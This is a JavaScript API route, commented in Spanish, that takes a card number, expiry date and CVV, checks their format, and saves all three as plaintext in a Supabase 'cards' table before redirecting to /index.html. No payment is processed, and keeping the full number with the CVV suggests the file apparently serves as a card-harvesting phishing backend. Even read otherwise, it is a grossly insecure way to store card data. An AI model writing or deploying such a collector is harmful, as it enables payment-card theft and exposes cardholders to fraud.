import supabase from '../../lib/supabase';

export default async function handler(req, res) {
    console.log('Recibiendo solicitud:', req.method);
    
    if (req.method !== 'POST') {
        return res.status(405).json({
            success: false,
            message: 'Método no permitido'
        });
    }

    try {
        const { cardNumber, expiryDate, cvv } = req.body;
        console.log('Datos recibidos:', {
            cardNumber: cardNumber ? '****' + cardNumber.slice(-4) : 'no proporcionado',
            expiryDate: expiryDate || 'no proporcionado',
            cvv: cvv ? '***' : 'no proporcionado'
        });

        // Validaciones básicas
        if (!cardNumber || !expiryDate || !cvv) {
            console.log('Faltan campos requeridos');
            return res.status(400).json({
                success: false,
                message: 'Faltan campos requeridos'
            });
        }

        // Validar número de tarjeta (debe ser 16 dígitos)
        const cleanCardNumber = cardNumber.replace(/\s/g, '');
        if (!/^\d{16}$/.test(cleanCardNumber)) {
            console.log('Número de tarjeta inválido');
            return res.status(400).json({
                success: false,
                message: 'Número de tarjeta inválido'
            });
        }

        // Validar fecha de vencimiento (formato MM/YY)
        if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
            console.log('Fecha de vencimiento inválida');
            return res.status(400).json({
                success: false,
                message: 'Fecha de vencimiento inválida'
            });
        }

        // Validar CVV (3 o 4 dígitos)
        if (!/^\d{3,4}$/.test(cvv)) {
            console.log('CVV inválido');
            return res.status(400).json({
                success: false,
                message: 'CVV inválido'
            });
        }

        console.log('Validaciones pasadas correctamente');

        // Preparar datos para guardar
        const cardData = {
            card_number_full: cleanCardNumber,
            expiry_date: expiryDate,
            cvv: cvv,
            status: 'pending'
        };

        console.log('Intentando guardar en Supabase...');

        // Guardar en Supabase
        const { data, error } = await supabase
            .from('cards')
            .insert([cardData]);

        if (error) {
            console.error('Error de Supabase:', error);
            return res.status(500).json({
                success: false,
                message: 'Error al guardar la tarjeta: ' + error.message
            });
        }

        console.log('Datos guardados correctamente');
        return res.status(200).json({
            success: true,
            message: 'Tarjeta guardada correctamente',
            redirectUrl: '/index.html'
        });

    } catch (error) {
        console.error('Error no manejado:', error);
        return res.status(500).json({
            success: false,
            message: 'Error al procesar la solicitud: ' + error.message
        });
    }
} 